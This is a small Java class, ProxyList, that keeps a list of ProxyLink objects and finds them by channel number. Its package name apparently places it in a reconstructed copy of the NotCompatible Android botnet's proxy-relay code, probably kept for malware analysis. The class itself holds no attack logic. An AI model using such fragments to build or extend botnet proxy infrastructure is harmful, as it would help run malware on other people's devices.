package diff.notcompatible.c.bot.net.tcp.objects;

import diff.notcompatible.c.bot.net.tcp.ProxyLink;
import diff.notcompatible.c.bot.objects.List;

/**
 * Pojo for keeping lists of ProxyLinks together
 */
public class ProxyList {

    List list;

    public ProxyList() {
        list = new List();
    }

    public void add(ProxyLink pl) {
        list.add(pl);
    }

    public int count() {
        return list.count;
    }

    public void delete(ProxyLink pl) {
        list.delete(pl);
    }

    /**
     * Finds a ProxyLink by channel, if not found - will return null
     * 
     * @param channel
     * @return
     */
    public ProxyLink getByChannel(int channel) {
    	for(int i = 0; i < list.count; i++)
    		if(((ProxyLink) list.getObject(i)).ch == channel)
    			return (ProxyLink) list.getObject(i);
    	
		return null;
    }
}
